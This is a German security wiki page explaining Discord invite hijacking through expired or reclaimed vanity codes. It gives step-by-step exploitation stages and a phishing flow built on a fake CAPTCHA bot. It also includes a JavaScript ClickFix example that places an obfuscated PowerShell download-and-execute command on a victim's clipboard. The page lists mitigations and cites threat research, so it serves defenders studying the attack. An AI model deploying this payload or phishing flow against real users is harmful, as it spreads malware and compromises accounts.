# Discord Invite Hijacking

{{#include ../../banners/hacktricks-training.md}}

Die Schwachstelle im Einladungsystem von Discord ermöglicht es Bedrohungsakteuren, abgelaufene oder gelöschte Einladungslinks (temporär, permanent oder benutzerdefiniert) als neue benutzerdefinierte Links auf jedem Level 3-boosted Server zu beanspruchen. Durch die Normalisierung aller Codes auf Kleinbuchstaben können Angreifer bekannte Einladungslinks vorregistrieren und den Verkehr stillschweigend übernehmen, sobald der ursprüngliche Link abläuft oder der Quellserver seinen Boost verliert.

## Einladungsarten und Hijack-Risiko

| Einladungsart         | Hijackbar? | Bedingung / Kommentare                                                                                     |
|-----------------------|-------------|------------------------------------------------------------------------------------------------------------|
| Temporärer Einladungslink | ✅          | Nach Ablauf wird der Code verfügbar und kann von einem boosted Server als benutzerdefinierte URL neu registriert werden. |
| Permanenter Einladungslink | ⚠️          | Wenn gelöscht und nur aus Kleinbuchstaben und Ziffern besteht, kann der Code wieder verfügbar werden.     |
| Benutzerdefinierter Vanity-Link | ✅          | Wenn der ursprüngliche Server seinen Level 3 Boost verliert, wird die benutzerdefinierte Einladung für eine neue Registrierung verfügbar. |

## Ausbeutungsstufen

1. Aufklärung
- Überwachen Sie öffentliche Quellen (Foren, soziale Medien, Telegram-Kanäle) nach Einladungslinks, die dem Muster `discord.gg/{code}` oder `discord.com/invite/{code}` entsprechen.
- Sammeln Sie interessante Einladungslinks (temporär oder benutzerdefiniert).
2. Vorregistrierung
- Erstellen oder verwenden Sie einen bestehenden Discord-Server mit Level 3 Boost-Rechten.
- In **Servereinstellungen → Vanity-URL** versuchen Sie, den Ziel-Einladungscode zuzuweisen. Wenn akzeptiert, wird der Code vom böswilligen Server reserviert.
3. Aktivierung des Hijacks
- Warten Sie bei temporären Einladungen, bis die ursprüngliche Einladung abläuft (oder löschen Sie sie manuell, wenn Sie die Quelle kontrollieren).
- Für Codes mit Großbuchstaben kann die Kleinbuchstabenvariante sofort beansprucht werden, obwohl die Umleitung erst nach Ablauf aktiviert wird.
4. Stille Umleitung
- Benutzer, die den alten Link besuchen, werden nahtlos an den vom Angreifer kontrollierten Server weitergeleitet, sobald der Hijack aktiv ist.

## Phishing-Flow über Discord-Server

1. Beschränken Sie die Serverkanäle, sodass nur ein **#verify**-Kanal sichtbar ist.
2. Setzen Sie einen Bot (z. B. **Safeguard#0786**) ein, um Neuankömmlinge zur Verifizierung über OAuth2 aufzufordern.
3. Der Bot leitet die Benutzer zu einer Phishing-Seite (z. B. `captchaguard.me`) unter dem Vorwand eines CAPTCHA- oder Verifizierungsschrittes weiter.
4. Implementieren Sie den **ClickFix** UX-Trick:
- Zeigen Sie eine fehlerhafte CAPTCHA-Nachricht an.
- Leiten Sie die Benutzer an, den **Win+R**-Dialog zu öffnen, einen vorab geladenen PowerShell-Befehl einzufügen und die Eingabetaste zu drücken.

### ClickFix Clipboard Injection Beispiel
```javascript
// Copy malicious PowerShell command to clipboard
const cmd = `powershell -NoExit -Command "$r='NJjeywEMXp3L3Fmcv02bj5ibpJWZ0NXYw9yL6MHc0RHa';` +
`$u=($r[-1..-($r.Length)]-join '');` +
`$url=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($u));` +
`iex (iwr -Uri $url)"`;
navigator.clipboard.writeText(cmd);
```
Dieser Ansatz vermeidet direkte Dateidownloads und nutzt vertraute UI-Elemente, um das Misstrauen der Benutzer zu verringern.

## Milderungsmaßnahmen

- Verwenden Sie permanente Einladungslinks, die mindestens einen Großbuchstaben oder ein nicht-alphanumerisches Zeichen enthalten (nie ablaufen, nicht wiederverwendbar).
- Rotieren Sie regelmäßig die Einladungs-Codes und widerrufen Sie alte Links.
- Überwachen Sie den Boost-Status des Discord-Servers und die Ansprüche auf benutzerdefinierte URLs.
- Schulen Sie die Benutzer, die Authentizität des Servers zu überprüfen und das Ausführen von in die Zwischenablage kopierten Befehlen zu vermeiden.

## Referenzen

- From Trust to Threat: Hijacked Discord Invites Used for Multi-Stage Malware Delivery – https://research.checkpoint.com/2025/from-trust-to-threat-hijacked-discord-invites-used-for-multi-stage-malware-delivery/
- Discord Custom Invite Link Documentation – https://support.discord.com/hc/en-us/articles/115001542132-Custom-Invite-Link

{{#include ../../banners/hacktricks-training.md}}
